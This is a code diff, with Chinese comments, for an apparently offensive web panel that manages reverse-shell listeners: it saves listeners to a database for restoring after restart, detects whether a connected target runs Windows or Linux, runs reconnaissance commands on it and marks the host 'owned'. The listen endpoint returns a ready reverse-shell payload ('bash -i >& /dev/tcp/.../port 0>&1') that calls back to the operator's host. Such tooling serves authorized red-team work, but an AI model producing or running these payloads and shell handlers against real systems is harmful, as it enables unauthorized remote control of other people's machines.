@@ -14,7 +14,7 @@ from sqlalchemy.orm import Session as DBSession
 
 from ..config import DEFAULT_PROJECT_ID
 from ..db import get_attack, get_db, get_session_factory, now
-from ..models import Host, Shell
+from ..models import Host, ReverseListener, Shell
 from ..schemas import ShellIn, ShellOut
 from ..schemas.common import rid
 from ..service import add_event
@@ -22,7 +22,7 @@ from ..service import filestage as stage_svc
 from ..service import tty as tty_svc
 from ..service.probe import run_probes
 from ..session import SessionError, get_session
-from ..session.reverse import SERVICE as REVERSE_SERVICE
+from ..session.reverse import SERVICE as REVERSE_SERVICE, detect_platform
 from ..ws import manager
 from .deps import get_project
 
@@ -32,6 +32,8 @@ router = APIRouter()
 REVERSE_CHANNELS: dict[str, object] = {}
 #: 原始输出订阅表：shellId -> sink（面板终端打开时注册，关闭时注销）
 RAW_SINKS: dict[str, object] = {}
+#: 启动恢复失败的监听：listenerId -> 错误原因（前端据此提示「重试恢复」）
+RESTORE_ERRORS: dict[str, str] = {}
 
 
 def close_channel(shell_id: str) -> None:
@@ -169,6 +171,12 @@ def _collect_host_info(db: DBSession, host: Host, output: str) -> str:
     if m:
         host.privilege = m.group(1)
         parts.append(f"whoami={m.group(1)}")
+    else:
+        # Windows whoami 回显形如 DOMAIN\user（域账号带 $ 结尾的机器账号也覆盖）
+        m = re.search(r"^([A-Za-z0-9._-]+)\\([A-Za-z0-9._$-]+)\s*$", output, re.M)
+        if m:
+            host.privilege = m.group(2)
+            parts.append(f"whoami={m.group(2)}")
     m = re.search(r"(Linux [^\r\n]+|Windows[^\r\n]*)", output)
     if m:
         host.os = m.group(1).strip()[:190]
@@ -641,27 +649,117 @@ def reverse_listen(form: ReverseListenIn):
             bind, form.port, form.label, replace_pending=form.replacePending)
     except SessionError as e:
         return JSONResponse({"ok": False, "stage": "listen", "error": str(e)})
+    _persist_listener(lis)
     connected = lis.wait(form.waitS) if form.waitS and form.waitS > 0 else False
     return {"ok": True, "listener": lis.to_dict(), "replaced": replaced, "connected": connected,
             "payload": f"bash -i >& /dev/tcp/{bind}/{int(form.port)} 0>&1"}
 
 
+def _persist_listener(lis) -> None:
+    """监听写入持久表（面板重启后自动恢复）；同地址端口的旧记录先清掉。"""
+    db = get_session_factory()()
+    try:
+        db.query(ReverseListener).filter(
+            ReverseListener.bind == lis.bind,
+            ReverseListener.port == lis.port,
+            ReverseListener.id != lis.id,
+        ).delete(synchronize_session=False)
+        if db.get(ReverseListener, lis.id) is None:
+            db.add(ReverseListener(
+                id=lis.id, bind=lis.bind, port=lis.port, label=lis.label,
+                created_at=now().strftime("%Y-%m-%d %H:%M:%S"),
+            ))
+        db.commit()
+    finally:
+        db.close()
+
+
+def restore_reverse_listeners() -> dict:
+    """按持久表恢复监听（面板启动时调用）。
+
+    地址已失效（休眠 / 换网）或端口被占时不删记录，把原因记入 RESTORE_ERRORS：
+    前端在监听列表里显示为「未恢复」，可用「重试恢复」重新拉起。
+    """
+    RESTORE_ERRORS.clear()
+    db = get_session_factory()()
+    restored, failed = 0, []
+    try:
+        for row in db.query(ReverseListener).all():
+            try:
+                REVERSE_SERVICE.open(row.bind, row.port, row.label,
+                                     replace_pending=False, listener_id=row.id)
+                restored += 1
+            except Exception as e:  # 单个监听恢复失败不影响其余
+                RESTORE_ERRORS[row.id] = str(e)
+                failed.append({"id": row.id, "bind": row.bind, "port": row.port,
+                               "error": str(e)})
+    finally:
+        db.close()
+    return {"restored": restored, "failed": failed}
+
+
 @router.get("/shells/reverse/listeners")
 def reverse_listeners():
-    """列出进程内监听与回连状态。"""
-    return {"listeners": REVERSE_SERVICE.list()}
+    """监听列表 = 进程内活跃监听 + 持久表里尚未恢复的监听（含失败原因）。"""
+    active = {l["id"]: l for l in REVERSE_SERVICE.list()}
+    db = get_session_factory()()
+    try:
+        rows = db.query(ReverseListener).all()
+    finally:
+        db.close()
+    out = []
+    for r in rows:
+        item = active.pop(r.id, None)
+        if item is None:
+            item = {"id": r.id, "bind": r.bind, "port": r.port, "label": r.label,
+                    "connected": False, "peer": None, "active": False,
+                    "error": RESTORE_ERRORS.get(r.id, "")}
+        else:
+            item["active"] = True
+            item["error"] = ""
+        out.append(item)
+    for item in active.values():  # 进程内但未落库（理论上不会出现）
+        item["active"] = True
+        item["error"] = ""
+        out.append(item)
+    return {"listeners": out}
+
+
+@router.post("/shells/reverse/listeners/restore")
+def reverse_listeners_restore():
+    """重试恢复启动时失败的监听（换网后地址又回来了等场景）。"""
+    return restore_reverse_listeners()
 
 
 @router.delete("/shells/reverse/listeners/{listener_id}")
 def reverse_listener_close(listener_id: str):
-    """关闭单个监听（释放端口）。"""
-    return {"ok": REVERSE_SERVICE.close(listener_id)}
+    """关闭单个监听（释放端口）并删除持久记录。"""
+    ok = REVERSE_SERVICE.close(listener_id)
+    db = get_session_factory()()
+    try:
+        row = db.get(ReverseListener, listener_id)
+        if row is not None:
+            db.delete(row)
+            db.commit()
+            ok = True
+    finally:
+        db.close()
+    RESTORE_ERRORS.pop(listener_id, None)
+    return {"ok": ok}
 
 
 @router.delete("/shells/reverse/listeners")
 def reverse_listener_close_all():
-    """关闭全部监听（休眠 / 收尾后清理残留端口）。"""
-    return {"ok": True, "closed": REVERSE_SERVICE.close_all()}
+    """关闭全部监听（休眠 / 收尾后清理残留端口）并清空持久记录。"""
+    closed = REVERSE_SERVICE.close_all()
+    db = get_session_factory()()
+    try:
+        db.query(ReverseListener).delete(synchronize_session=False)
+        db.commit()
+    finally:
+        db.close()
+    RESTORE_ERRORS.clear()
+    return {"ok": True, "closed": closed}
 
 
 class ReverseIOIn(BaseModel):
@@ -817,8 +915,15 @@ def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
     s.alive = t.ok
     s.latency = t.ms if t.ok else 0
     s.last_beat_at = now() if t.ok else None
+    if t.ok:
+        # 平台按回连回显识别（不再固定 linux）：决定后续文件命令与终端固化技法选择
+        platform = detect_platform(ch) or "linux"
+        ch.platform = platform
+        s.platform = platform
     if t.ok and form.autoCollect:
-        info = ch.exec("id; uname -a; hostname")
+        probe = ("whoami; ver; hostname" if s.platform == "windows"
+                 else "id; uname -a; hostname")
+        info = ch.exec(probe)
         collect_detail = _collect_host_info(db, host, info.output)
     if s.alive:
         host.owned = True
